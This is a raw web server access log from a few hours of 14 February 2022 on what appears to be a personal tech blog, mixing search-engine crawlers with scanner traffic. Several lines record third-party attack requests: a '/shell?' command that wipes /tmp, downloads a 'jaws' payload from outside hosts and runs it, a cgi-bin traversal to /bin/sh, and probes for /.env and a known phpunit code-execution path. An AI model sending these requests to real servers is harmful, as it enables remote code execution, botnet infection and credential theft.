192.241.207.214 - - [14/Feb/2022:02:04:57 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
128.14.233.55 - - [14/Feb/2022:02:21:44 +0100] "GET / HTTP/1.1" 301 162 "-" "curl/7.29.0"
111.13.63.72 - - [14/Feb/2022:02:28:56 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2166.2 Safari/537.36"
111.13.63.72 - - [14/Feb/2022:02:28:57 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2166.2 Safari/537.36"
111.13.63.72 - - [14/Feb/2022:02:28:57 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2166.2 Safari/537.36"
111.13.63.72 - - [14/Feb/2022:02:28:58 +0100] "GET //robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2166.2 Safari/537.36"
111.13.63.72 - - [14/Feb/2022:02:28:58 +0100] "GET //sitemap.xml HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2166.2 Safari/537.36"
111.13.63.72 - - [14/Feb/2022:02:28:58 +0100] "GET //.well-known/security.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2166.2 Safari/537.36"
185.127.53.131 - - [14/Feb/2022:02:44:06 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+ botaflatoon.sytes.net/jaws;sh+/tmp/jaws HTTP/1.1" 301 162 "-" "Hello, world"
185.44.60.40 - - [14/Feb/2022:02:44:08 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+ botaflatoon.sytes.net/jaws;sh+/tmp/jaws HTTP/1.1" 301 162 "-" "Hello, world"
23.236.147.154 - - [14/Feb/2022:03:02:28 +0100] "GET / HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
23.236.147.154 - - [14/Feb/2022:03:02:46 +0100] "" 400 0 "-" "-"
23.236.147.154 - - [14/Feb/2022:03:02:46 +0100] "" 400 0 "-" "-"
23.236.147.154 - - [14/Feb/2022:03:02:46 +0100] "" 400 0 "-" "-"
23.236.147.154 - - [14/Feb/2022:03:03:03 +0100] "GET /robots.txt HTTP/1.1" 200 1345 "-" "-"
23.236.147.154 - - [14/Feb/2022:03:03:04 +0100] "GET /sitemap.xml HTTP/1.1" 200 1345 "-" "-"
23.236.147.154 - - [14/Feb/2022:03:03:04 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 1345 "-" "-"
23.236.147.154 - - [14/Feb/2022:03:03:05 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
23.236.147.154 - - [14/Feb/2022:03:03:09 +0100] "\x03Y\xB8\x09b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
23.236.147.154 - - [14/Feb/2022:03:03:10 +0100] "" 400 0 "-" "-"
23.129.64.210 - - [14/Feb/2022:03:37:32 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:03:38:54 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
138.118.241.191 - - [14/Feb/2022:03:39:11 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
23.129.64.219 - - [14/Feb/2022:03:43:25 +0100] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 200 1345 "-" "-"
23.129.64.219 - - [14/Feb/2022:03:43:26 +0100] "OPTIONS / HTTP/1.0" 405 150 "-" "-"
23.129.64.219 - - [14/Feb/2022:03:43:28 +0100] "\x00\x00\x07\x00\x08\x00\x03\x00\x04\x00\x05\x00\x06" 400 150 "-" "-"
23.129.64.219 - - [14/Feb/2022:03:43:40 +0100] "\x00\x00\x00n\xFESMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03" 400 150 "-" "-"
181.239.168.162 - - [14/Feb/2022:04:11:31 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
192.241.208.64 - - [14/Feb/2022:04:18:37 +0100] "GET /manager/html HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
45.146.165.37 - - [14/Feb/2022:04:33:21 +0100] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 150 "-" "-"
34.140.248.32 - - [14/Feb/2022:04:56:22 +0100] "GET / HTTP/1.1" 301 162 "-" "python-requests/2.27.1"
45.146.165.37 - - [14/Feb/2022:04:59:29 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.137.21.134 - - [14/Feb/2022:05:06:17 +0100] "GET /dispatch.asp HTTP/1.1" 301 162 "-" "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X; en-US) AppleWebKit/531.5.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6531.5.2"
2.58.149.136 - - [14/Feb/2022:05:42:48 +0100] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
114.119.135.232 - - [14/Feb/2022:05:46:21 +0100] "GET /content/images/size/w2000/2021/10/Screenshot_8.png HTTP/1.1" 200 243714 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
157.55.39.149 - - [14/Feb/2022:05:59:03 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.79 - - [14/Feb/2022:05:59:13 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
114.119.135.232 - - [14/Feb/2022:06:04:53 +0100] "GET /signin/ HTTP/1.1" 404 12247 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.79.27 - - [14/Feb/2022:06:48:33 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.31 - - [14/Feb/2022:06:48:34 +0100] "GET /weekly-stories-3/amp/ HTTP/1.1" 200 6267 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
3.85.115.88 - - [14/Feb/2022:06:55:26 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.85.115.88 - - [14/Feb/2022:06:55:27 +0100] "GET /rss/ HTTP/1.1" 200 3444 "-" "Forem Feeds Importer"
20.24.42.8 - - [14/Feb/2022:07:03:29 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.24.42.8 - - [14/Feb/2022:07:03:30 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.24.42.8 - - [14/Feb/2022:07:19:51 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.24.42.8 - - [14/Feb/2022:07:19:52 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
71.6.165.200 - - [14/Feb/2022:07:50:02 +0100] "GET / HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
71.6.165.200 - - [14/Feb/2022:07:50:09 +0100] "" 400 0 "-" "-"
71.6.165.200 - - [14/Feb/2022:07:50:09 +0100] "" 400 0 "-" "-"
71.6.165.200 - - [14/Feb/2022:07:50:10 +0100] "" 400 0 "-" "-"
71.6.165.200 - - [14/Feb/2022:07:50:20 +0100] "GET /robots.txt HTTP/1.1" 200 1345 "-" "-"
71.6.165.200 - - [14/Feb/2022:07:50:21 +0100] "GET /sitemap.xml HTTP/1.1" 200 1345 "-" "-"
71.6.165.200 - - [14/Feb/2022:07:50:24 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 1345 "-" "-"
71.6.165.200 - - [14/Feb/2022:07:50:26 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
71.6.165.200 - - [14/Feb/2022:07:50:27 +0100] "" 400 0 "-" "-"
71.6.165.200 - - [14/Feb/2022:07:50:31 +0100] "\x03\xB2\xFB\x09b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
66.249.79.27 - - [14/Feb/2022:08:01:43 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
178.32.197.94 - - [14/Feb/2022:08:01:59 +0100] "GET / HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
89.46.237.45 - - [14/Feb/2022:08:07:11 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.79.31 - - [14/Feb/2022:08:31:43 +0100] "GET /weekly-stories-2/amp/ HTTP/1.1" 200 6563 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.154.228.11 - - [14/Feb/2022:08:54:55 +0100] "GET / HTTP/1.1" 200 1345 "-" "libwww-perl/6.60"
66.249.79.29 - - [14/Feb/2022:09:01:43 +0100] "GET /tag/kubernetes-advanced/ HTTP/1.1" 200 13059 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.29 - - [14/Feb/2022:09:01:54 +0100] "GET /assets/images/tag-bg.svg?v=37bff49e5b HTTP/1.1" 200 1553 "https://krzwiatrzyk.eu/tag/kubernetes-advanced/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.27 - - [14/Feb/2022:09:01:54 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.27 - - [14/Feb/2022:09:01:54 +0100] "GET /assets/scripts/pagination.js?v=37bff49e5b HTTP/1.1" 200 864 "https://krzwiatrzyk.eu/tag/kubernetes-advanced/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
60.191.125.35 - - [14/Feb/2022:09:09:18 +0100] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
60.191.125.35 - - [14/Feb/2022:09:09:19 +0100] "CONNECT 112.124.42.80:443 HTTP/1.1" 400 150 "-" "-"
106.45.9.139 - - [14/Feb/2022:09:09:20 +0100] "HEAD http://110.242.68.4/ HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
106.45.9.139 - - [14/Feb/2022:09:09:21 +0100] "CONNECT 110.242.68.4:443 HTTP/1.1" 400 150 "-" "-"
222.237.16.245 - - [14/Feb/2022:09:10:24 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws HTTP/1.1" 301 162 "-" "Hello, world"
45.146.165.37 - - [14/Feb/2022:09:27:35 +0100] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:09:27:35 +0100] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 47 "http://85.255.1.106:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
207.46.13.234 - - [14/Feb/2022:09:33:12 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.234 - - [14/Feb/2022:09:33:13 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.44 - - [14/Feb/2022:09:33:15 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
71.6.199.23 - - [14/Feb/2022:09:41:30 +0100] "GET / HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
71.6.199.23 - - [14/Feb/2022:09:41:38 +0100] "" 400 0 "-" "-"
71.6.199.23 - - [14/Feb/2022:09:41:38 +0100] "" 400 0 "-" "-"
71.6.199.23 - - [14/Feb/2022:09:41:39 +0100] "" 400 0 "-" "-"
71.6.199.23 - - [14/Feb/2022:09:41:43 +0100] "GET /robots.txt HTTP/1.1" 200 1345 "-" "-"
71.6.199.23 - - [14/Feb/2022:09:41:44 +0100] "GET /sitemap.xml HTTP/1.1" 200 1345 "-" "-"
71.6.199.23 - - [14/Feb/2022:09:41:45 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 1345 "-" "-"
71.6.199.23 - - [14/Feb/2022:09:41:46 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
71.6.199.23 - - [14/Feb/2022:09:41:48 +0100] "" 400 0 "-" "-"
71.6.199.23 - - [14/Feb/2022:09:41:48 +0100] "\x03\xCA\x15" 400 150 "-" "-"
130.211.54.158 - - [14/Feb/2022:09:43:46 +0100] "GET / HTTP/1.1" 400 248 "-" "python-requests/2.27.1"
188.165.87.100 - - [14/Feb/2022:09:44:10 +0100] "GET /favicon.ico HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
